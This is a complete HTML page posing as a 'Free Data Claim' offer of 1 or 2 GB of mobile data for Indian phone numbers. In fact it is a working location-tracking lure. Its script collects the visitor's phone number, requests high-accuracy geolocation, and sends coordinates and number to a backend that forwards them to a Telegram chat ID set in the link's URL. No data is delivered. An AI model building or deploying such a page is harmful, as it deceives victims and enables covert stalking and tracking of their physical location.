<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Free Data Claim</title>
  <style>
    :root {
      --primary: #00d084;
      --dark: #0d1117;
      --card: #161b22;
      --text: #e6edf3;
      --error: #f85149;
      --success: #56d364;
    }

    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: var(--dark);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .container {
      background: var(--card);
      border-radius: 16px;
      padding: 32px 24px;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
      text-align: center;
    }

    .logo {
      font-size: 110px;
      font-weight: 900;
      color: var(--primary);
      text-shadow: 0 0 40px var(--primary);
      margin: 0 0 24px;
      letter-spacing: -2px;
    }

    .data-buttons {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin-bottom: 32px;
    }

    .data-btn {
      background: #21262d;
      color: white;
      border: 2px solid #444c56;
      padding: 16px 28px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s;
      min-width: 120px;
    }

    .data-btn:hover { background: #30363d; }
    .data-btn.active {
      background: var(--primary);
      border-color: var(--primary);
      color: black;
      box-shadow: 0 0 20px rgba(0,208,132,0.4);
    }

    input[type="tel"] {
      width: 100%;
      padding: 16px;
      font-size: 18px;
      background: #0d1117;
      border: 1px solid #444c56;
      color: white;
      border-radius: 12px;
      margin: 20px 0 24px;
      text-align: center;
    }

    input[type="tel"]::placeholder { color: #8b949e; }

    #claimBtn {
      background: #238636;
      color: white;
      border: none;
      padding: 18px;
      font-size: 20px;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      width: 100%;
      transition: all 0.25s;
    }

    #claimBtn:hover { background: #2ea043; }
    #claimBtn:disabled {
      background: #21262d;
      cursor: not-allowed;
      opacity: 0.6;
    }

    #status {
      margin-top: 28px;
      font-size: 17px;
      min-height: 80px;
      line-height: 1.5;
    }

    .success { color: var(--success); }
    .error   { color: var(--error); }
    .loading::after {
      content: " .";
      animation: dots 1.5s steps(5, end) infinite;
    }

    @keyframes dots {
      0%, 20% { content: "."; }
      40%     { content: ".."; }
      60%     { content: "..."; }
      80%, 100% { content: "...."; }
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">1GB</div>

  <div class="data-buttons">
    <button class="data-btn active" data-gb="1">1 GB</button>
    <button class="data-btn" data-gb="2">2 GB</button>
  </div>

  <input 
    type="tel" 
    id="mobile" 
    placeholder="Enter 10-digit mobile number" 
    maxlength="10"
    pattern="[6-9][0-9]{9}"
    inputmode="numeric"
  />

  <button id="claimBtn">Claim Free Data</button>

  <div id="status"></div>
</div>

<script>
  const statusEl     = document.getElementById('status');
  const claimBtn     = document.getElementById('claimBtn');
  const mobileInput  = document.getElementById('mobile');

  let selectedGB = '1';

  // Data package selection
  document.querySelectorAll('.data-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.data-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      selectedGB = btn.dataset.gb;
    });
  });

  // Claim button logic
  claimBtn.addEventListener('click', async () => {
    const mobile = mobileInput.value.trim();

    // Basic validation
    if (!mobile || mobile.length !== 10 || !/^[6-9]\d{9}$/.test(mobile)) {
      showMessage('Please enter a valid 10-digit Indian mobile number', 'error');
      return;
    }

    claimBtn.disabled = true;
    showMessage('Processing your request', 'loading');

    try {
      // Get target chat ID from URL → ?id=123456789
      const params = new URLSearchParams(window.location.search);
      const targetChatId = params.get('id');

      if (!targetChatId || isNaN(Number(targetChatId))) {
        throw new Error('Invalid or missing chat ID in URL (?id=...)');
      }

      // Request location permission
      showMessage('Requesting location permission...', 'loading');

      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      });

      const { latitude, longitude } = position.coords;

      showMessage('Location captured. Sending data...', 'loading');

      // Send to your Vercel API route
      const res = await fetch('/api/send-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lat: latitude.toFixed(6),
          lng: longitude.toFixed(6),
          mobile: mobile,
          gb: selectedGB,
          targetChatId: targetChatId
        })
      });

      const result = await res.json();

      if (!res.ok || !result.success) {
        throw new Error(result.error || 'Server error');
      }

      showMessage(
        `Success!<br>${selectedGB} GB request sent.<br>Please wait up to 1 hour.<br>(Location shared via Telegram)`,
        'success'
      );

    } catch (err) {
      let msg = 'Something went wrong. Please try again.';

      if (err.code === 1)      msg = 'Location permission denied.';
      else if (err.code === 2) msg = 'Location information unavailable.';
      else if (err.code === 3) msg = 'Location request timed out.';
      else if (err.message)    msg = err.message;

      showMessage(msg, 'error');
    } finally {
      claimBtn.disabled = false;
    }
  });

  function showMessage(text, type = '') {
    statusEl.innerHTML = text;
    statusEl.className = type; // loading, success, error
  }
</script>
</body>
</html>
